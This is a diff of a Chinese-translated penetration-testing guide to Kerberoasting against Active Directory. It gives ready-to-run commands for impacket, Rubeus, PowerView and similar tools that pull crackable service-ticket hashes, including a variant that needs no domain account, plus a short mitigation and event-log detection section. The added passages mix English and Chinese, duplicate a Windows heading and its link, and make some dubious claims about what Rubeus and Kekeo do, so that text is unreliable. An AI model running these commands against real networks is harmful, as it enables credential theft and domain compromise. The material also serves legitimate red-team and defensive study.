@@ -47,7 +47,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-多功能工具，包括可用于kerberoast攻击的用户信息转储：
+多功能工具，包括可用于kerberoast攻击的用户信息的转储：
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -83,9 +83,25 @@ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_
 ```
 * **技术2：自动化工具**
 
-Automatic tools can greatly simplify the process of performing a Kerberoasting attack. These tools automate the steps involved in requesting and cracking Kerberos tickets, making it easier for attackers to exploit this vulnerability.
+Automatic tools can greatly simplify the process of performing a Kerberoasting attack. These tools automate the steps involved in requesting and cracking service tickets, making the attack more efficient and less time-consuming.
 
-常规工具可以极大地简化执行Kerberoasting攻击的过程。这些工具自动化了请求和破解Kerberos票据的步骤，使攻击者更容易利用这个漏洞。
+自动化工具可以极大地简化执行Kerberoasting攻击的过程。这些工具自动化了请求和破解服务票据的步骤，使攻击更加高效和节省时间。
+
+One popular tool for Kerberoasting is "Rubeus," which is a powerful command-line tool developed in C#. It allows attackers to request and crack service tickets using various techniques, such as brute-forcing, dictionary attacks, and password spraying.
+
+一个流行的Kerberoasting工具是“Rubeus”，它是一个用C#开发的强大命令行工具。它允许攻击者使用各种技术（如暴力破解、字典攻击和密码喷洒）请求和破解服务票据。
+
+To use Rubeus, attackers need to have valid domain credentials. Once authenticated, they can use Rubeus to request service tickets for specific accounts or groups. Rubeus then saves the tickets to a file, which can be cracked offline using tools like "Hashcat" or "John the Ripper."
+
+要使用Rubeus，攻击者需要拥有有效的域凭据。一旦通过身份验证，他们可以使用Rubeus为特定的账户或组请求服务票据。然后，Rubeus将票据保存到一个文件中，可以使用像“Hashcat”或“John the Ripper”这样的工具离线破解。
+
+Another popular tool for Kerberoasting is "Kekeo," which is a powerful toolkit developed in C++. Kekeo provides a wide range of functionalities for Kerberos-related attacks, including the ability to request and crack service tickets.
+
+另一个流行的Kerberoasting工具是“Kekeo”，它是一个用C++开发的强大工具包。Kekeo提供了广泛的功能，用于与Kerberos相关的攻击，包括请求和破解服务票据的能力。
+
+Attackers can use Kekeo to request service tickets for specific accounts or groups, and then crack the tickets offline using tools like "Hashcat" or "John the Ripper." Kekeo also supports advanced techniques, such as AS-REP Roasting and TGS-REP Roasting.
+
+攻击者可以使用Kekeo为特定的账户或组请求服务票据，然后使用像“Hashcat”或“John the Ripper”这样的工具离线破解票据。Kekeo还支持高级技术，如AS-REP Roasting和TGS-REP Roasting。
 ```bash
 # Powerview: Get Kerberoast hash of a user
 Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
@@ -127,9 +143,9 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whatever
 ```
 您可以在这里找到有用的**工具**来进行**kerberoast**攻击：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-如果您在Linux上遇到以下**错误**：**`Kerberos SessionError: KRB_AP_ERR_SKEW(时钟偏差太大)`**，这是由于您的本地时间不同步，您需要将主机与域控制器同步。有几种选项：
+如果您在Linux上遇到以下**错误**：**`Kerberos SessionError: KRB_AP_ERR_SKEW(时钟偏差太大)`**，这是由于您的本地时间与域控制器不同步。有几种解决方法：
 
-* `ntpdate <域控制器的IP>` - 在Ubuntu 16.04之后已弃用
+* `ntpdate <域控制器的IP>` - 在Ubuntu 16.04之后已被弃用
 * `rdate -n <域控制器的IP>`
 
 ### 缓解措施
@@ -148,6 +164,32 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whatever
 * 使用托管服务帐户（定期自动更改密码和委派SPN管理）
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
+```
+## 不需要域账户的Kerberoast攻击
+
+在2022年9月，[Charlie Clark](https://exploit.ph/)发现了一种漏洞，可以通过KRB_AS_REQ请求获取ST（Service Tickets），而无需控制任何Active Directory账户。如果一个主体可以在没有预身份验证的情况下进行身份验证（如AS-REP Roasting攻击），则可以使用它来发起一个**KRB_AS_REQ**请求，并通过修改请求的req-body部分中的**sname**属性，欺骗请求要求获取一个**ST**而不是一个**加密的TGT**。
+
+该技术在这篇文章中得到了详细解释：[Semperis博客文章](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。
+
+{% hint style="warning" %}
+您必须提供一个用户列表，因为我们没有有效的账户来使用这种技术查询LDAP。
+{% endhint %}
+
+#### Linux
+
+* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
+```bash
+GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
+```
+#### Windows
+
+* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+
+#### Windows
+
+* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+```bash
+Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
 **在ired.team中了解有关Kerberoasting的更多信息**[**这里**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**和**[**这里**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**。**
 
